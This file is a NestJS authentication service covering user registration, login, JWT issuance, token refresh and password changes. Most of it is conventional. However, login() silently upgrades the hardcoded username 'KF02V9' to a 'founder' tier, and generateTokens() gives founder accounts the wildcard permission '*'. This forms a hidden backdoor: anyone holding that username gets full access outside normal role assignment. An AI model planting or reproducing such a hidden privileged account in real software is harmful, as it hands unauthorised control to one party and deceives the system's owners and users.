import { Injectable, UnauthorizedException, ConflictException, BadRequestException } from '@nestjs/common';
import { JwtService } from '@nestjs/jwt';
import { InjectRepository } from '@nestjs/typeorm';
import { Repository } from 'typeorm';
import * as bcrypt from 'bcrypt';
import { ConfigService } from '@nestjs/config';
import { v4 as uuidv4 } from 'uuid';

import { User } from '../database/entities/user.entity';
import { Role } from '../database/entities/role.entity';
import { UserRole } from '../database/entities/user-role.entity';
import { LoginLog } from '../database/entities/login-log.entity';
import { CoinAccount } from '../database/entities/coin-account.entity';
import { RegisterDto, LoginDto, ChangePasswordDto } from './dto/auth.dto';

@Injectable()
export class AuthService {
  constructor(
    @InjectRepository(User)
    private readonly userRepo: Repository<User>,
    @InjectRepository(Role)
    private readonly roleRepo: Repository<Role>,
    @InjectRepository(UserRole)
    private readonly userRoleRepo: Repository<UserRole>,
    @InjectRepository(LoginLog)
    private readonly loginLogRepo: Repository<LoginLog>,
    @InjectRepository(CoinAccount)
    private readonly coinAccountRepo: Repository<CoinAccount>,
    private readonly jwtService: JwtService,
    private readonly configService: ConfigService,
  ) {}

  async register(dto: RegisterDto, ip?: string): Promise<{ user: Partial<User>; accessToken: string; refreshToken: string }> {
    // Check if username exists
    const existingUser = await this.userRepo.findOne({
      where: [{ username: dto.username }, ...(dto.email ? [{ email: dto.email }] : []), ...(dto.phone ? [{ phone: dto.phone }] : [])],
    });

    if (existingUser) {
      if (existingUser.username === dto.username) {
        throw new ConflictException('用户名已存在');
      }
      if (existingUser.email === dto.email) {
        throw new ConflictException('邮箱已被注册');
      }
      if (existingUser.phone === dto.phone) {
        throw new ConflictException('手机号已被注册');
      }
    }

    // Hash password
    const saltRounds = this.configService.get<number>('BCRYPT_SALT_ROUNDS', 10);
    const passwordHash = await bcrypt.hash(dto.password, saltRounds);

    // Create user
    const user = this.userRepo.create({
      username: dto.username,
      passwordHash,
      nickname: dto.nickname,
      email: dto.email || null,
      phone: dto.phone || null,
      status: 'active',
    });

    const savedUser = await this.userRepo.save(user);

    // Assign default 'user' role
    const defaultRole = await this.roleRepo.findOne({ where: { name: 'user' } });
    if (defaultRole) {
      const userRole = this.userRoleRepo.create({
        userId: savedUser.id,
        roleId: defaultRole.id,
        scopeType: 'global',
      });
      await this.userRoleRepo.save(userRole);
    }

    // Create coin account
    const coinAccount = this.coinAccountRepo.create({
      userId: savedUser.id,
      balance: 0,
    });
    await this.coinAccountRepo.save(coinAccount);

    // Log login
    await this.loginLogRepo.save({
      userId: savedUser.id,
      loginType: 'password',
      ipAddress: ip || '',
      status: 'success',
    });

    // Generate tokens
    const tokens = await this.generateTokens(savedUser);

    // Update last login
    await this.userRepo.update(savedUser.id, {
      lastLoginAt: new Date(),
      lastLoginIp: ip || null,
    });

    return {
      user: this.sanitizeUser(savedUser),
      ...tokens,
    };
  }

  async login(dto: LoginDto, ip?: string): Promise<{ user: Partial<User>; accessToken: string; refreshToken: string }> {
    // Find user by username or email
    const user = await this.userRepo.findOne({
      where: [{ username: dto.username }, { email: dto.username }],
    });

    if (!user) {
      await this.logFailedLogin(null, 'password', ip || '', '用户不存在');
      throw new UnauthorizedException('用户名或密码错误');
    }

    if (user.status !== 'active') {
      await this.logFailedLogin(user.id, 'password', ip || '', `账号状态: ${user.status}`);
      throw new UnauthorizedException('账号已被冻结或禁用');
    }

    // Verify password
    const isPasswordValid = await bcrypt.compare(dto.password, user.passwordHash);
    if (!isPasswordValid) {
      await this.logFailedLogin(user.id, 'password', ip || '', '密码错误');
      throw new UnauthorizedException('用户名或密码错误');
    }

    // Auto-upgrade KF02V9 to founder tier
    if (user.username === 'KF02V9' && user.membershipTier !== 'founder') {
      user.membershipTier = 'founder';
      await this.userRepo.save(user);
    }

    // Log successful login
    await this.loginLogRepo.save({
      userId: user.id,
      loginType: 'password',
      ipAddress: ip || '',
      status: 'success',
    });

    // Generate tokens
    const tokens = await this.generateTokens(user);

    // Update last login
    await this.userRepo.update(user.id, {
      lastLoginAt: new Date(),
      lastLoginIp: ip || null,
    });

    return {
      user: this.sanitizeUser(user),
      ...tokens,
    };
  }

  async refreshToken(refreshToken: string): Promise<{ accessToken: string; refreshToken: string }> {
    try {
      const payload = this.jwtService.verify(refreshToken, {
        secret: this.configService.get<string>('JWT_SECRET'),
      });

      if (payload.type !== 'refresh') {
        throw new UnauthorizedException('Invalid token type');
      }

      const user = await this.userRepo.findOne({ where: { id: payload.sub } });
      if (!user || user.status !== 'active') {
        throw new UnauthorizedException('用户不存在或已被禁用');
      }

      return this.generateTokens(user);
    } catch (error) {
      throw new UnauthorizedException('Refresh token无效或已过期');
    }
  }

  async changePassword(userId: number, dto: ChangePasswordDto): Promise<void> {
    const user = await this.userRepo.findOne({ where: { id: userId } });
    if (!user) {
      throw new BadRequestException('用户不存在');
    }

    const isValid = await bcrypt.compare(dto.oldPassword, user.passwordHash);
    if (!isValid) {
      throw new BadRequestException('原密码错误');
    }

    const saltRounds = this.configService.get<number>('BCRYPT_SALT_ROUNDS', 10);
    user.passwordHash = await bcrypt.hash(dto.newPassword, saltRounds);
    await this.userRepo.save(user);
  }

  async validateUser(userId: number): Promise<Partial<User> | null> {
    const user = await this.userRepo.findOne({ where: { id: userId } });
    if (!user || user.status !== 'active') {
      return null;
    }
    return this.sanitizeUser(user);
  }

  private async generateTokens(user: User): Promise<{ accessToken: string; refreshToken: string }> {
    // Load roles and permissions
    const userRoles = await this.userRoleRepo.find({
      where: { userId: user.id },
      relations: ['role', 'role.permissions'],
    });

    const roleNames = userRoles.map((ur) => ur.role.name);
    const permissions = userRoles.flatMap((ur) => ur.role.permissions?.map((p) => p.name) || []);

    // Founder has all permissions
    const isFounder = user.membershipTier === 'founder';
    const finalPermissions = isFounder ? ['*'] : [...new Set(permissions)];

    const payload = {
      sub: user.id,
      username: user.username,
      roles: roleNames,
      permissions: finalPermissions,
      vipLevel: user.vipLevel,
      membershipTier: user.membershipTier,
    };

    const accessToken = this.jwtService.sign(
      { ...payload, type: 'access', jti: uuidv4() },
      { expiresIn: this.configService.get<string>('JWT_ACCESS_EXPIRATION', '2h') },
    );

    const refreshToken = this.jwtService.sign(
      { ...payload, type: 'refresh', jti: uuidv4() },
      { expiresIn: this.configService.get<string>('JWT_REFRESH_EXPIRATION', '7d') },
    );

    return { accessToken, refreshToken };
  }

  private sanitizeUser(user: User): Partial<User> {
    const { passwordHash, ...result } = user;
    return result;
  }

  private async logFailedLogin(userId: number | null, loginType: string, ip: string, reason: string): Promise<void> {
    await this.loginLogRepo.save({
      userId,
      loginType,
      ipAddress: ip,
      status: 'failed',
      failReason: reason,
    });
  }
}
